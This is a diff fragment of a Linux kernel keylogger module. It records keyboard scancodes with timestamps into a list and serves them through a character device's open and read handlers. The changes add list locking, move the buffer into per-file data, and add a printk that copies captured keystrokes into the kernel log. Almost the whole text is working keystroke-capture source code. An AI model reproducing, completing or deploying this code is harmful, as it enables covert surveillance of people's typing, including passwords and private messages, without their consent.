@@ -6,6 +6,8 @@ static unsigned int scan_array[SIZE];
 
 DEFINE_RWLOCK(keyboard_rwlock);
 
+DEFINE_RWLOCK(keylist_rwlock);
+
 static unsigned int windex = -1;
 
 static unsigned int rindex = 0;
@@ -20,8 +22,6 @@ static struct fsm scan_fsm = {
 
 LIST_HEAD(keystroke_list);
 
-static char	*klg_buffer = NULL;
-
 /* Multiples fd sync and protect */
 /* multi buffer, multi flush ? */
 
@@ -33,10 +33,13 @@ int	keylogger_open(struct inode *inode, struct file *filp)
 	char			tmp[60];
 	int			retval = 0;
 	ssize_t			written;
+	char			*klg_buffer = NULL;
 
+	read_lock(&keylist_rwlock);
 	list_for_each(pos, &keystroke_list) {
 		size++;
 	}
+	read_unlock(&keylist_rwlock);
 
 	printk(KERN_INFO "nbr entries %lu\n", size);
 	/* change the way it's calculed */
@@ -48,15 +51,19 @@ int	keylogger_open(struct inode *inode, struct file *filp)
 
 	memset(tmp, 0, 60);
 	memset(klg_buffer, 0, 60 * size);
+	read_lock(&keylist_rwlock);
 	list_for_each_entry(ks, &keystroke_list, list) {
 		written = sprintf(tmp, "[%04d-%02d-%02d %02d:%02d:%02d] %s %s %x\n", ks->tm.tm_year + 1900,
 			ks->tm.tm_mon + 1, ks->tm.tm_mday, ks->tm.tm_hour, ks->tm.tm_min, ks->tm.tm_sec,
 			ks->name, (ks->state == 0) ? "PRESSED" : "RELEASED", ks->ascii);
 		strncat(klg_buffer, tmp, written);
 	}
+	read_unlock(&keylist_rwlock);
 
 	/* init dev->size to length of klg_buffer */
+	/* klg_buffer should be local to device */
 
+	filp->private_data = klg_buffer;
 err:
 	return retval;
 }
@@ -64,7 +71,7 @@ err:
 int	keylogger_flush(struct file *filp, fl_owner_t id)
 {
 	printk(KERN_INFO "flushing klg_buffer\n");
-	kfree(klg_buffer);
+	kfree(filp->private_data);
 
 	return 0;
 }
@@ -78,9 +85,11 @@ ssize_t keylogger_read(struct file *filp, char __user *buffer,
 	ssize_t		retval = 0;
 	size_t		count = 0;
 	size_t		s;
+	char		*klg_buffer = filp->private_data;
 
 	/* read semaphore or spinlock */
 
+	printk(KERN_INFO "keylogger_read [%s]", klg_buffer);
 	/* size of buffer is dynamic */
 	s = strlen(klg_buffer);
 	if (*offset == s)
@@ -135,7 +144,7 @@ static void do_tasklet(unsigned long unused)
 			target = windex;
 		scan_fsm_update(&scan_fsm, packet);
 		if (scan_fsm.state == SUCCESS)
-			scan_fsm_send(&scan_fsm, &keystroke_list);
+			scan_fsm_send(&scan_fsm, &keystroke_list, &keylist_rwlock);
 		if (scan_fsm.state == ERROR || scan_fsm.state == SUCCESS)
 			scan_fsm_clear(&scan_fsm);
 	}
